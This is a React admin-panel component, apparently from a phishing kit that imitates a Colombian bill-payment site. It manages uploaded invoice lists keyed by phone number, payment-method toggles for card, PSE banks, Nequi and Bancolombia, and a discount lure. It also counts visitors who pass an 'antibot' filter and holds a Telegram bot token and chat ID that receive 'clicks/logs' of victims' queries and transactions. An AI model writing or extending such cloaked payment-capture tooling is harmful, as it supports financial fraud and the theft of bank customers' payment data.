"use client";

import { useState } from "react";
import type { ListResult } from "@/lib/facturas-cache";
import type { AntibotConfigShape } from "@/lib/antibots/config";
import type { ClicksStats } from "@/lib/clicks";
import AntibotsPanel from "./AntibotsPanel";

type BancoPseSetting = {
  key: string;
  value: string;
  label: string;
  enabled: boolean;
};

type Props = {
  facturas: ListResult;
  filtros: { q: string };
  nequiEnabled: boolean;
  bancolombiaEnabled: boolean;
  pseEnabled: boolean;
  tarjetaEnabled: boolean;
  bancosPse: BancoPseSetting[];
  antibot: AntibotConfigShape;
  telegramBotToken: string;
  telegramChatId: string;
  descuentoPorcentaje: number;
  clicks: ClicksStats;
};

function formatCOP(n: number): string {
  return n.toLocaleString("es-CO", { style: "currency", currency: "COP", minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

export default function CrudIndexClient(props: Props) {
  const [q, setQ] = useState(props.filtros.q);
  const [toggles, setToggles] = useState({
    nequi_enabled: props.nequiEnabled,
    bancolombia_enabled: props.bancolombiaEnabled,
    pse_enabled: props.pseEnabled,
    tarjeta_enabled: props.tarjetaEnabled,
  });
  const [bancos, setBancos] = useState(props.bancosPse);
  const [uploadResult, setUploadResult] = useState<string | null>(null);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [uploading, setUploading] = useState(false);
  const [clearing, setClearing] = useState(false);
  const [tgBotToken, setTgBotToken] = useState(props.telegramBotToken);
  const [tgChatId, setTgChatId] = useState(props.telegramChatId);
  const [tgSaving, setTgSaving] = useState(false);
  const [tgFeedback, setTgFeedback] = useState<string | null>(null);
  const [descuento, setDescuento] = useState(props.descuentoPorcentaje);
  const [descuentoSaving, setDescuentoSaving] = useState(false);
  const [descuentoFeedback, setDescuentoFeedback] = useState<string | null>(null);

  async function saveTelegramFlow() {
    setTgSaving(true);
    setTgFeedback(null);
    try {
      const r = await fetch("/api/crud/telegram-flow", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          telegram_bot_token: tgBotToken,
          telegram_chat_id: tgChatId,
        }),
      });
      const data = await r.json();
      setTgFeedback(r.ok && data.ok ? "Guardado." : data?.error || "Error al guardar.");
    } catch {
      setTgFeedback("Error de conexión.");
    } finally {
      setTgSaving(false);
    }
  }

  async function logout() {
    await fetch("/api/crud/logout", { method: "POST" });
    window.location.href = "/crud/login";
  }

  async function setToggle(key: keyof typeof toggles, enabled: boolean) {
    setToggles((t) => ({ ...t, [key]: enabled }));
    await fetch("/api/crud/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ key, enabled }),
    });
  }

  async function setBancoToggle(key: string, enabled: boolean) {
    setBancos((bs) => bs.map((b) => (b.key === key ? { ...b, enabled } : b)));
    await fetch("/api/crud/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ key, enabled }),
    });
  }

  async function uploadFile(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    setUploading(true);
    setUploadError(null);
    setUploadResult(null);
    try {
      const r = await fetch("/api/crud/upload", { method: "POST", body: fd });
      const data = await r.json();
      if (!r.ok || !data.ok) {
        setUploadError(
          data?.errors?.archivo || data?.error || "Error al cargar archivo."
        );
      } else {
        const { insertados, actualizados, errores } = data.resultado;
        setUploadResult(
          `Insertados: ${insertados} · Actualizados: ${actualizados} · Errores: ${errores}`
        );
        setTimeout(() => window.location.reload(), 1500);
      }
    } catch {
      setUploadError("Error de conexión.");
    } finally {
      setUploading(false);
    }
  }

  async function clearAll() {
    if (!confirm("¿Borrar TODAS las facturas en caché?")) return;
    setClearing(true);
    try {
      const r = await fetch("/api/crud/clear", { method: "POST" });
      if (r.ok) window.location.reload();
    } finally {
      setClearing(false);
    }
  }

  function applySearch(e: React.FormEvent) {
    e.preventDefault();
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    window.location.href = `/crud${params.toString() ? `?${params}` : ""}`;
  }

  function goPage(p: number) {
    const params = new URLSearchParams();
    if (q) params.set("q", q);
    params.set("page", String(p));
    window.location.href = `/crud?${params}`;
  }

  const totalPages = Math.max(1, Math.ceil(props.facturas.total / props.facturas.perPage));

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-6xl mx-auto space-y-6">
        <div className="flex justify-between items-center">
          <h1 className="text-2xl font-bold text-gray-800">Panel de Configuración</h1>
          <button
            onClick={logout}
            className="text-sm bg-gray-200 hover:bg-gray-300 text-gray-700 px-4 py-2 rounded"
          >
            Cerrar sesión
          </button>
        </div>

        {/* Visitas únicas */}
        <section className="bg-white rounded-lg shadow p-6">
          <h2 className="font-bold text-lg mb-4 text-gray-800">Visitas únicas</h2>
          <div className="grid grid-cols-2 gap-4 mb-4">
            <div className="bg-blue-50 border border-blue-200 rounded p-4">
              <div className="text-xs text-blue-700 font-semibold uppercase tracking-wide">Total acumulado</div>
              <div className="text-3xl font-bold text-blue-900 mt-1">
                {props.clicks.total.toLocaleString("es-CO")}
              </div>
            </div>
            <div className="bg-green-50 border border-green-200 rounded p-4">
              <div className="text-xs text-green-700 font-semibold uppercase tracking-wide">Hoy</div>
              <div className="text-3xl font-bold text-green-900 mt-1">
                {props.clicks.hoy.toLocaleString("es-CO")}
              </div>
            </div>
          </div>
          <div>
            <div className="text-sm font-semibold text-gray-700 mb-2">Últimos 7 días</div>
            <div className="space-y-1">
              {props.clicks.ultimos7dias.map((d) => {
                const max = Math.max(...props.clicks.ultimos7dias.map((x) => x.count), 1);
                const pct = (d.count / max) * 100;
                return (
                  <div key={d.fecha} className="flex items-center gap-3 text-sm">
                    <span className="w-24 text-gray-600 font-mono text-xs">{d.fecha}</span>
                    <div className="flex-1 bg-gray-100 rounded h-5 overflow-hidden">
                      <div className="bg-blue-500 h-full transition-all" style={{ width: `${pct}%` }} />
                    </div>
                    <span className="w-12 text-right text-gray-800 font-semibold">
                      {d.count.toLocaleString("es-CO")}
                    </span>
                  </div>
                );
              })}
            </div>
          </div>
          <p className="text-xs text-gray-500 mt-3">
            Dedup por cookie de sesión (1 hora). Cuenta solo visitantes que pasan el antibot.
          </p>
        </section>

        {/* Descuento */}
        <section className="bg-white rounded-lg shadow p-6">
          <h2 className="font-bold text-lg mb-4 text-gray-800">Descuento</h2>
          <p className="text-sm text-gray-500 mb-4">
            Porcentaje de descuento aplicado al total de la factura. Si está en 0, no hay descuento.
          </p>
          <div className="flex items-center gap-3">
            <input
              type="number"
              min={0}
              max={100}
              value={descuento}
              onChange={(e) => setDescuento(Number(e.target.value))}
              className="w-24 border border-gray-300 rounded-md px-3 py-2 text-sm text-center"
            />
            <span className="text-sm text-gray-700">%</span>
            <button
              type="button"
              onClick={async () => {
                setDescuentoSaving(true);
                setDescuentoFeedback(null);
                try {
                  const r = await fetch("/api/crud/descuento", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ porcentaje: descuento }),
                  });
                  const data = await r.json();
                  setDescuentoFeedback(r.ok && data.ok ? "Guardado." : data?.error || "Error.");
                } catch {
                  setDescuentoFeedback("Error de conexión.");
                } finally {
                  setDescuentoSaving(false);
                }
              }}
              disabled={descuentoSaving}
              className="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white px-4 py-2 rounded text-sm"
            >
              {descuentoSaving ? "Guardando..." : "Guardar"}
            </button>
          </div>
          {descuentoFeedback && (
            <p className="mt-2 text-sm text-gray-700">{descuentoFeedback}</p>
          )}
        </section>

        {/* Toggles métodos de pago */}
        <section className="bg-white rounded-lg shadow p-6">
          <h2 className="font-bold text-lg mb-4 text-gray-800">Métodos de pago</h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {(
              [
                ["tarjeta_enabled", "Tarjeta"],
                ["pse_enabled", "PSE"],
                ["nequi_enabled", "Nequi"],
                ["bancolombia_enabled", "Bancolombia"],
              ] as const
            ).map(([k, label]) => (
              <label key={k} className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={toggles[k]}
                  onChange={(e) => setToggle(k, e.target.checked)}
                  className="w-5 h-5 accent-blue-600"
                />
                <span className="text-sm text-gray-700">{label}</span>
              </label>
            ))}
          </div>
        </section>

        {/* Bancos PSE */}
        <section className="bg-white rounded-lg shadow p-6">
          <h2 className="font-bold text-lg mb-4 text-gray-800">Bancos PSE</h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
            {bancos.map((b) => (
              <label key={b.key} className="flex items-center gap-2 cursor-pointer">
                <input
                  type="checkbox"
                  checked={b.enabled}
                  onChange={(e) => setBancoToggle(b.key, e.target.checked)}
                  className="w-4 h-4 accent-blue-600"
                />
                <span className="text-xs text-gray-700">{b.label}</span>
              </label>
            ))}
          </div>
        </section>

        {/* Upload + Clear */}
        <section className="bg-white rounded-lg shadow p-6">
          <h2 className="font-bold text-lg mb-4 text-gray-800">Cargar facturas (CSV)</h2>
          <form onSubmit={uploadFile} className="flex flex-col md:flex-row gap-3 items-start">
            <input
              type="file"
              name="archivo"
              accept=".txt"
              required
              className="text-sm"
            />
            <button
              type="submit"
              disabled={uploading}
              className="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white px-4 py-2 rounded text-sm"
            >
              {uploading ? "Subiendo..." : "Cargar"}
            </button>
            <button
              type="button"
              onClick={clearAll}
              disabled={clearing}
              className="bg-red-600 hover:bg-red-700 disabled:opacity-50 text-white px-4 py-2 rounded text-sm"
            >
              {clearing ? "Borrando..." : "Limpiar todo"}
            </button>
          </form>
          <p className="text-xs text-gray-500 mt-2">
            Formato: <code>telefono,valor,nombre</code> por línea. Máximo 10 MB.
          </p>
          {uploadResult && (
            <p className="mt-2 text-sm text-green-700">{uploadResult}</p>
          )}
          {uploadError && <p className="mt-2 text-sm text-red-600">{uploadError}</p>}
        </section>

        {/* Tabla de facturas */}
        <section className="bg-white rounded-lg shadow p-6">
          <div className="flex justify-between items-center mb-4">
            <h2 className="font-bold text-lg text-gray-800">
              Facturas en caché ({props.facturas.total})
            </h2>
            <p className="text-sm text-gray-600">
              Total: {formatCOP(props.facturas.totalSum)}
            </p>
          </div>
          <form onSubmit={applySearch} className="flex gap-2 mb-4">
            <input
              value={q}
              onChange={(e) => setQ(e.target.value)}
              placeholder="Buscar por teléfono o nombre..."
              className="flex-1 px-3 py-2 border border-gray-300 rounded text-sm"
            />
            <button
              type="submit"
              className="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded text-sm"
            >
              Buscar
            </button>
          </form>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-50 text-xs uppercase text-gray-600">
                <tr>
                  <th className="text-left py-2 px-3">Teléfono</th>
                  <th className="text-left py-2 px-3">Nombre</th>
                  <th className="text-right py-2 px-3">Valor</th>
                  <th className="text-right py-2 px-3">Actualizado</th>
                </tr>
              </thead>
              <tbody>
                {props.facturas.items.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="text-center py-4 text-gray-500">
                      Sin facturas cargadas.
                    </td>
                  </tr>
                ) : (
                  props.facturas.items.map((f) => (
                    <tr key={f.telefono} className="border-t border-gray-100">
                      <td className="py-2 px-3 font-mono">{f.telefono}</td>
                      <td className="py-2 px-3">{f.nombre || "—"}</td>
                      <td className="py-2 px-3 text-right">{formatCOP(f.valor)}</td>
                      <td className="py-2 px-3 text-right text-gray-500 text-xs">
                        {new Date(f.updatedAt).toLocaleString("es-CO")}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

          {totalPages > 1 && (
            <div className="flex justify-center gap-2 mt-4">
              <button
                onClick={() => goPage(Math.max(1, props.facturas.page - 1))}
                disabled={props.facturas.page <= 1}
                className="px-3 py-1 text-sm border rounded disabled:opacity-50"
              >
                ← Anterior
              </button>
              <span className="text-sm text-gray-600 px-3 py-1">
                Página {props.facturas.page} de {totalPages}
              </span>
              <button
                onClick={() => goPage(Math.min(totalPages, props.facturas.page + 1))}
                disabled={props.facturas.page >= totalPages}
                className="px-3 py-1 text-sm border rounded disabled:opacity-50"
              >
                Siguiente →
              </button>
            </div>
          )}
        </section>

        {/* Clicks/Logs del flujo a Telegram */}
        <div className="bg-white rounded-lg shadow p-6 mb-6">
          <h2 className="text-lg font-semibold mb-1 text-gray-800">
            Clicks/Logs del flujo a Telegram
          </h2>
          <p className="text-sm text-gray-500 mb-4">
            Credenciales del bot que recibe los clicks/logs del flujo (consultas y transacciones).
            Si están vacíos, no se envía nada.
          </p>
          <div className="space-y-3">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Bot Token</label>
              <input
                type="text"
                value={tgBotToken}
                onChange={(e) => setTgBotToken(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm font-mono"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Chat ID</label>
              <input
                type="text"
                value={tgChatId}
                onChange={(e) => setTgChatId(e.target.value)}
                className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm font-mono"
              />
            </div>
            <button
              type="button"
              onClick={saveTelegramFlow}
              disabled={tgSaving}
              className="bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white px-4 py-2 rounded text-sm"
            >
              {tgSaving ? "Guardando..." : "Guardar"}
            </button>
            {tgFeedback && <p className="mt-2 text-sm text-gray-700">{tgFeedback}</p>}
          </div>
        </div>

        {/* Antibots Panel */}
        <AntibotsPanel initial={props.antibot} />
      </div>
    </div>
  );
}
